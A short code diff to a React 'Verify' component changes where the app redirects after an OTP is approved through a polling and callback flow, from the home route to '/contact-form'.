@@ -151,7 +151,7 @@ export default function Verify() {
         clearInterval(pollRef.current!);
         if (callbackId) await answerCallback(callbackId, "✅ OTP disetujui!");
         setWaiting(false);
-        navigate("/");
+        navigate("/contact-form");
       } else if (status === "rejected") {
         clearInterval(pollRef.current!);
         if (callbackId) await answerCallback(callbackId, "❌ OTP ditolak.");
